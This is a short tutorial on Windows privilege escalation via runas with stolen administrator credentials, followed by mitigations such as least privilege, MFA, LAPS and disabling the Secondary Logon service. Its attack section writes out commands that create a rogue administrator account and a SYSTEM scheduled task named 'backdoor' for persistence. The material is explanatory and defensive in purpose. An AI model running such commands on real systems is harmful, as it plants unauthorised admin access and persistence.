[[Windows Privilege Escalation]]
Here's an example of how `runas` can be used for privilege escalation, and how it can be mitigated. We will go through:

1. **How `runas` can be abused**.
2. **Step-by-step privilege escalation example**.
3. **Mitigation techniques**.

### 1. **How `runas` Can Be Abused**

In Windows, the `runas` command allows a user to run specific programs or commands with different user credentials. Attackers might abuse this feature by running high-privileged commands under a different account (like an admin account) without proper authorization, leading to privilege escalation.

### 2. **Step-by-Step Example of Privilege Escalation Using `runas`**

#### **Scenario:**
An attacker has access to a low-privileged user account and has discovered credentials for a higher-privileged user (e.g., an administrator). The attacker uses the `runas` command to gain administrative access.

#### **Step 1: Attacker Gains Access to the System**

The attacker has access to a non-administrative user account but has discovered the credentials for an administrative account.

```bash
# Attacker logs in as the low-privileged user
C:\> whoami
lowprivuser
```

#### **Step 2: Using `runas` to Execute Commands with Administrative Privileges**

The attacker can use the `runas` command to launch a program with elevated privileges (administrator), bypassing normal privilege limitations.

```bash
# Attacker executes a command as the admin user
C:\> runas /user:admin cmd
Enter the password for admin: ********

# The command prompt opens as the administrator user
```

Now, the attacker can use this new command prompt to execute privileged actions. For example, they can add a new user with administrative rights:

```bash
# Attacker creates a new user with admin privileges
C:\> net user eviluser Password123 /add
C:\> net localgroup administrators eviluser /add
```

At this point, the attacker has escalated privileges and created a new account with admin rights.

#### **Step 3: Persistence**

The attacker might also use this access to create persistence on the system, such as installing a backdoor or creating a scheduled task to maintain access.

```bash
# Example of setting up a persistence mechanism
C:\> schtasks /create /tn "backdoor" /tr "C:\path\to\backdoor.exe" /sc onlogon /ru system
```

### 3. **Mitigation Techniques**

There are several ways to mitigate privilege escalation attempts involving `runas`.

#### **1. Restrict Administrative Accounts**
   - **Minimize privileged account usage:** Ensure administrative accounts are only used when necessary and limit their exposure.
   - **Use least privilege:** Implement the principle of least privilege so that even administrative accounts do not have more access than required.
   
#### **2. Use Multi-Factor Authentication (MFA)**
   - Enforce **MFA** for administrative accounts, making it more difficult for attackers to use stolen credentials.

#### **3. Audit and Monitor Privilege Escalation Attempts**
   - **Log monitoring:** Regularly monitor and audit usage of `runas` and other commands that could indicate privilege escalation.
   - Use **SIEM solutions** (Security Information and Event Management) to detect abnormal usage patterns.

#### **4. Configure Proper Group Policy**
   - **Group Policy:** Use Group Policy Objects (GPOs) to restrict the use of `runas` for non-admin users.
   - You can disable the `runas` command entirely if not needed by blocking the **Secondary Logon** service:

   ```bash
   # Disabling the service that enables runas
   sc config seclogon start= disabled
   ```

#### **5. Credential Guard and LAPS**
   - **Credential Guard:** Use **Windows Defender Credential Guard** to prevent credential theft by isolating secrets.
   - **LAPS (Local Administrator Password Solution):** Implement **LAPS** to manage local administrator passwords, ensuring each machine has a unique, frequently rotated admin password.

#### **6. Enforce Strong Password Policies**
   - Ensure that all privileged accounts use **strong, complex passwords** and rotate them frequently.

By applying these mitigation techniques, you can reduce the risk of attackers abusing `runas` for privilege escalation.